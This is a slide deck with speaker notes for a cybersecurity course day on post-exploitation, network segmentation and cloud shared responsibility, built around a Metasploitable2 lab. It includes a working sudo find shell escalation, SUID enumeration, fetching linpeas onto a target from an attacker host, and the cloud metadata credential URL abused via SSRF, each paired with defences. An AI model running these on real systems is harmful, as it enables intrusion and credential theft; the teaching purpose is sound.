---
marp: true
theme: dark-monospace
paginate: true
title: "Day 17 — Post-Exploitation + Infrastructure & Cloud"
footer: "Practical Cyber Security (v2) · Week 4 · Day 17"
---

<!-- _class: lead -->

# After the break-in
## Day 17 — Post-exploitation, and the same failures at network & cloud scale

**Week 4 · Applying it, and choosing a direction**

<!--
RUN SHEET (~85 min). TWO-PART DAY — two disciplines. Treat it as such:

  PART 1 — post-exploitation (through the attack-chain artifact).  target: DONE by minute 48.
  PART 2 — infrastructure + cloud.
  >>> MID-POINT GATE at minute 48: if the priv-esc DO ran long and you're not at "the attack
      chain" slide, drop persistence/lateral/pivot to a 90-second name-check, do the attack
      chain, then Part 2 becomes: infra = a 4-min bullet run, shared responsibility (full),
      the bucket/IAM DO is homework. NEVER cut shared responsibility or the attack-chain artifact.

00:00 Journey check + hook (low-priv -> root in 20s)           4   ┐
00:04 What a shell is + the post-ex goals                      5   │
00:09 Privilege escalation                                    10   │ PART 1
00:19 DO: shell -> linpeas -> priv-esc on Metasploitable2     16   │ (post-ex,
00:35 Persistence / lateral movement / pivoting                8   │  done by :48)
00:43 The attack chain + detection opportunities               7   ┘
00:50 Infrastructure security                                  8   ┐
00:58 Cloud security — shared responsibility                   8   │ PART 2
01:06 DO: fix an open bucket / IAM policy                     10   │ (infra + cloud)
01:16 Attack <-> defence + wrap + homework                     4   ┘
CUT FIRST IF SHORT: persistence/lateral/pivot slide to 4 min; infra slide to a 4-min bullet run.
NEVER CUT: privilege escalation + the priv-esc DO, the attack-chain-with-detection artifact,
shared responsibility, the bucket/IAM DO.
ANALOGY (kitchen): post-ex = you're inside after hours. Get the master key (priv-esc), prop a
door for later (persistence), move kitchen -> office -> safe (lateral movement), use the
restaurant's van to reach the warehouse (pivoting). Cloud = a chain of restaurants sharing one
supplier who says "we lock the building; what's in your unit is your problem".
ETHICS: Metasploitable2 / assigned lab target only (the ROE). Post-ex stays on that box.
-->

---

## Where we are

- **Days 12–16:** getting *in* — recon, scan, exploit (services, web).
- **Today:** what happens *next* — and why **one foothold becomes the whole company**.
- Then: the same "who can reach what" failures at **network** and **cloud** scale.

<!--
Journey Check. Getting a shell is the START of the interesting part, not the end. This is
lifecycle Phase 5 (post-exploitation).
-->

---

## Hook — 20 seconds from user to root

```
$ id
uid=1001(devuser) gid=1001 groups=1001
$ sudo -l
  (devuser) NOPASSWD: /usr/bin/find
$ sudo find . -exec /bin/sh \; -quit
# id
uid=0(root) gid=0(root)
```

One loose `sudo` rule. **Getting in was step one of many.**

<!--
`find` can run commands (`-exec`), and `sudo` runs it as root -> instant root shell. This is a
GTFOBins classic (Day 7). Land it: "the exploit got them a low-priv shell; THIS is how it
becomes game over."
-->

---

## What a shell is — and what you do with it

A **shell** = a command interpreter running **as some user** on the target.

- **reverse** shell (target connects back to you) vs **bind** shell (you connect to it) — Day 9.
- often a weak "dumb" shell first → **upgrade to a full TTY**.

**Post-exploitation goals:**
escalate privileges · establish persistence · discover the environment · move laterally ·
collect credentials & data · exfiltrate — **quietly.**

<!--
Metasploit gives you a `meterpreter` session (a feature-rich agent) or a plain `shell`.
The goals list = the rest of today. "Quietly" = the whole reason Day 19 (Blue team) exists.
-->

---

## Privilege escalation

You land as a **limited user**. You want **root / SYSTEM / Administrator**.

| Linux | Windows |
|---|---|
| SUID binaries (Day 7) | unquoted service paths |
| `sudo` misconfig / GTFOBins | weak service / file permissions |
| writable cron job or service file | token impersonation (Day 8) |
| kernel exploit (`DirtyPipe`, `PwnKit`) | `AlwaysInstallElevated` |
| Linux capabilities | credential reuse / cached creds |

**The pattern (again):** *something powerful trusts something you control.*

<!--
Tools automate the hunt: `linpeas.sh` / `linenum.sh` (Linux), `winPEAS` / `PowerUp` (Windows).
They dump everything interesting; you spot the path. Kernel exploits are last resort (can
crash the box).
-->

---

## Do it now — shell → escalate

Guided, on `<LAB_HOST>` (Metasploitable2):

1. Get a shell (Metasploit module from Day 15, or `nc` from a web RCE).
2. Enumerate: `id`, `sudo -l`, `find / -perm -4000 -type f 2>/dev/null`, `uname -a`
   — or run `linpeas.sh` (transfer it first).
3. **Find one escalation path.** Take it.
4. `id` → confirm root. **Screenshot the whole chain** (start user → command → root).

<!--
16 min. Metasploitable2 has many paths: the `distcc`/`udev`/`nfs` routes, an old kernel,
world-writable cron. Coach the same way as Day 15.
linpeas: `wget http://<your-kali>/linpeas.sh` on the target (host it with `python3 -m http.server`).
Non-root -> root is the proof. This is Phase 5 of the engagement journal.
-->

---

## Persistence · lateral movement · pivoting

- **Persistence** — a way back in that survives a reboot: a cron job, a new service, an added
  SSH key, a Windows Run key / scheduled task (Day 8). *"If they reboot, am I still in?"*
- **Lateral movement** — reuse what you found (passwords, hashes, SSH keys, tokens) to hop to
  the **next** box. *pass-the-hash*, reused local-admin passwords (Day 8 → LAPS), SSH key reuse.
- **Pivoting** — route your traffic **through** the compromised host to reach networks you
  **can't touch directly** (SSH tunnel, `ssh -D`, Metasploit `route`).

**One foothold → the whole internal network.**

<!--
This is why a flat internal network is dangerous - one workstation compromise reaches the
database, the DC, everything. Segmentation (next) breaks the chain.
CUT to 4 min if behind - name the three, one line each.
-->

---

## The attack chain — and where a defender sees it

```
 phish -> foothold -> priv-esc -> persistence -> recon -> lateral -> DA -> data -> exfil
   |         |           |            |            |         |        |      |       |
  email    new proc   unusual     service      internal   SMB auth  mass   large  big
  gateway  on EDR     sudo/4104   created      port scan  from a WS  LDAP   reads  outbound
```

**Every attacker step is a detection opportunity.** Prevention will miss some — detection
catches the chain. (Day 19.)

<!--
THIS IS THE ARTIFACT. Students draw their own version: the chain + one thing a SOC could see
at each step. It's the bridge from Red to Blue and the reason "assume breach" (Day 10) matters.
-->

---

## Infrastructure security — "who can reach what" at scale

- **Segmentation** — the workstation LAN should **not** be able to reach the database.
  VLANs, firewall zones, micro-segmentation, zero-trust ("verify every connection").
- **Firewalls** — allow only what's needed, in **and out** (Day 3). Default deny.
- **IDS / IPS** — detect (IDS) or block (IPS) known-bad patterns on the wire.
- **VPN** — encrypted remote access — but it's a **trust grant**; a stolen VPN cred = inside.
- **Bastion / jump host** — one hardened, logged entry point to sensitive zones.
- **Egress filtering** — restrict outbound → breaks C2 beacons and exfil.

<!--
The theme: the internal network is not "trusted" just because it's internal (assume breach).
Segmentation is the single highest-value control against lateral movement.
CUT to a 4-min bullet run if behind.
-->

---

## Cloud — the shared responsibility model

| The provider secures... | **You** secure... |
|---|---|
| physical data centres | **your data** |
| the hypervisor / host OS | **your access config (IAM)** |
| the network backbone | **your OS & app patching** (IaaS) |
| managed-service internals | **your firewall / security-group rules** |
| | **who can see your storage** |

**"It's in the cloud" does not mean "someone else secures it."**

<!--
The split shifts by service model: with a managed database (PaaS) the provider patches the DB;
with a VM (IaaS) you do. The CONSTANT is: identity, access config, and data are always yours.
-->

---

## The two classic cloud failures

1. **Public storage bucket** — an S3 / GCS / Blob container left world-readable. Countless
   breaches (millions of records) are just this. `"Principal": "*"`.
2. **Over-broad IAM** — a role or key with `Action: "*"` / `AdministratorAccess`. Then a
   leaked key, or an **SSRF → metadata endpoint** (Day 16!), hands an attacker *everything*.

**The fix is the same as every other day: least privilege.**

<!--
SSRF callback: `http://169.254.169.254/latest/meta-data/iam/security-credentials/` returns
temporary creds for whatever role the instance has. If that role is over-privileged, the SSRF
becomes account takeover. IMDSv2 mitigates; least-privilege roles are the real fix.
-->

---

## Containers — a lighter box, not a VM  *(if time — else it's reading)*

A container shares the **host's kernel** (a VM doesn't). So the isolation is thinner:

- **The Docker socket = root on the host.** A web app with access to `/var/run/docker.sock`
  can start a privileged container and own the machine.
- **`--privileged` / mounting the host filesystem** = a container escape by design.
- **Running as root inside the container** — if they break out, they're root outside too.

**Defence:** run as a non-root user in the container; never expose the Docker socket; no
`--privileged`; scan images (`trivy`, `grype`); drop capabilities; and remember containers are
a *packaging* boundary, not a *security* boundary like a VM.

<!--
This whole lab runs on containers (DVWA, Juice Shop) — point that out. The one idea to land:
"a container is not a VM; the kernel is shared; treat it like a process with extra packaging."
Kubernetes adds RBAC, network policies, admission control — name it as "the same questions at
cluster scale", Day 20 careers has a cloud/container path.
CUT ENTIRELY if behind — it's marked as reading; the homework points at it.
-->

---

## Do it now — fix the policy

Open `assets/bad-policy.json` (an IAM policy) and `assets/bad-bucket-policy.json`.

For each:
1. What does it currently allow? (read it out in plain English)
2. What's the specific over-grant? (`"*"` where?)
3. Rewrite it **least-privilege** — only the actions, resources, and principals actually needed.

<!--
10 min, paper exercise (no cloud account needed). If you have LocalStack / MinIO set up, do it
live against a real bucket. Answer key in teacher-notes.
The skill: reading a policy and spotting "this grants far more than the app needs".
-->

---

## Attack ↔ Defence

| Attacker does | Defender sees / does |
|---|---|
| escalate via a loose `sudo` rule | audit sudoers; alert on `sudo` to a shell; least privilege |
| add a cron job / service for persistence | file-integrity monitoring; alert on new services; EDR |
| pass-the-hash to the next box | unique local-admin passwords (LAPS); network segmentation |
| pivot through a workstation to the DB LAN | **segmentation** — the workstation can't reach the DB at all |
| SSRF → cloud metadata → creds | IMDSv2; least-privilege instance roles; egress filtering |
| exfiltrate to an external host | egress filtering; DLP; alert on large outbound |

<!--
The through-line: least privilege + segmentation + monitoring. Every row is one of those three.
-->

---

## Today's attack / defence / artifact

- **Attack:** a shell is the *start* — escalate, persist, move laterally, pivot, reach the data.
  The same access-control gaps scale to networks (flat = fatal) and cloud (public bucket,
  `*:*` IAM).
- **Defence:** least privilege everywhere, **network segmentation**, egress filtering, and
  monitoring at every step of the chain.
- **Artifact:** **"attack chain: initial access → data, with the detection opportunity at each
  step"** — your own diagram (`day17/attack-chain.md`).

---

## Homework

1. Draw `day17/attack-chain.md` — the full chain (foothold → priv-esc → persistence → lateral
   → data → exfil) with **one detection opportunity per step**. Commit it.
2. Add the **priv-esc chain** you found on Metasploitable2 to your Engagement Journal (Phase 5)
   — start user → the flaw → the command → root, with a screenshot.
3. Commit your **least-privilege rewrites** of `bad-policy.json` and `bad-bucket-policy.json`.
4. Add `privilege escalation`, `persistence`, `lateral movement`, `pivoting`, `pass-the-hash`,
   `segmentation`, `egress filtering`, `shared responsibility`, `IAM`, `IMDS` to your glossary.

<!--
Due start of Day 18.
-->

---

<!-- _class: lead -->

## Recap

1. **A shell is the start.** Escalate → persist → move laterally → pivot → reach the data.
2. **Flat networks are fatal.** Segmentation breaks the lateral-movement chain; least privilege breaks the rest.
3. **Cloud is shared responsibility.** Public buckets and `*:*` IAM are the same least-privilege failure as `chmod 777`.

<!--
Say the three lines. Tomorrow: the newest frontier - AI and cyber security. AI as a target, a
weapon, and a defender's tool. You'll prompt-inject a vulnerable app.
-->
